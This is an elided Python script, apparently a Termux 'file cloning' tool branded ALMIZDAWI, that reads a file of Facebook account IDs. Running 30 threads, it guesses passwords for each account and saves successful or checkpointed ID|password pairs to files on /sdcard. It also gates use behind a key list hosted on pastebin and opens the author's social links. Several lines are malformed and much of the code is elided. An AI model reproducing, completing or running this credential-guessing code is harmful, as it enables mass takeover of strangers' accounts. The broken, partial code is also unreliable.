...
os.system('am start https://www.facebook.com/profile.php?id=100089147156284&mibextid=ZbWKwL')
...
try:
    ...
    os.system('python MIZDAWI.py')

    os.system("xdg-openhttps://www.facebook.com/profile.php?id=100089147156284&mibextid=ZbWKwL")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/0aXSytr4").text
   ...
   if id in ses:
    ...
    print('ﻲﺒﺣ يﺭﻮﺘﺳ هﺭﻮﺒﻟﺍ ﻲﺑ ﻪﺻﺎﺧ تﺎﻛﺍﺮﺘﺷﺍ تﺍﺩﺍ')
...
key = "|".join(uuid)
link = requests.get("https://pastebin.com/0aXSytr4").text
if key in link:
   pass
else:
   print("Your key",key)
   os.system("نورت اداه المزداوي 🔥☠️")
   sys.exit()
from os import path
...
def clear():
        os.system('clear')
print('\033[1;37m[+] \033[1;32للصيد م مزداوي يغالي⬆️🔞...')
try:
...
⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⠋⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠇⠀⠰⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿........
  تم أعاده احيائها من المزداوي
    اداه صيد ملفات يتريس 🔥

\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mTOOL NAME\033[1;97m ●   \33[1;92mALMIZDAWI 🔥
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92mM. A. ALMIZDAWI
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92mALMIZDAWI-VIP
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m2.0 V
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mTOOLS\033[1;97m     ●   \033[1;92mFILE VIP🔥
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
        print('\033[1;32m-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
...
def menu():
        try:
                ...
                if 1==1:
                        clear()
                        print('\033[1;37m[1] FILE CLONING\n\033[1;37m[2] My channel \n\033[1;37m[0] 𝗘??𝗶𝘁')
                        linex()
                        xd=input('\033[1;37m[?] 𝗖𝗵𝗼𝗶𝗰𝗲 : ')
                        if xd in ['1','01']:
                                os.system('https://t.me/DEVIL_LY0');clear()
                                file = input('\033[1;37m ➜ ENTER THE FILE: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' 𝗙𝗶𝗹𝗲 𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱')
                                        time.sleep(1)
                                        menu()
                                clear()
                                ...
                                linex()
                                print('\u001b[2;31m 𝗗𝗼 𝘆𝗼𝘂 𝘄𝗲𝗻𝘁 𝘀𝗵𝗼𝘄 𝗰𝗽 𝗮𝗰𝗰𝗼𝘂𝗻𝘁? (y/n): ')
                                linex()
                                cx=input(' 𝗖𝗵𝗼𝗼𝘀𝗲: ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' TOTAL IDS IN FILE: \033[1;32m'+total_ids)
                                        linex()
                                        linex()
                                        for user in fo:
                                ...
                                os.system(' xdg-open https://t.me/DEVIL_LY0');menu()
                        elif xd in ['3','03']:
                                exit('DEVIL+') 
                        elif xd in ['4','04']:
                                clear()
...
def pak():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        linex() 
                        print(f'\033[1;37mFOR FUCK  MY GAND FAST  ACTIVE  LUN JAHAZ MODE')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALMIZDAWI🔞🔥] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [ALMIZDAWI🔞🔥] %s | %s'%(ids,pas))
                                open('/sdcard/ALMIZDAWI🔞🔥-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ALMIZDAWI🔞🔥] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALMIZDAWI🔞🔥-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ALMIZDAWI🔞🔥] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALMIZDAWI🔞🔥-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ALMIZDAWI🔞🔥] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ALMIZDAWI🔞🔥] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALMIZDAWI🔞🔥-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [ALMIZDAWI🔞🔥] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ALMIZDAWI🔞🔥-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
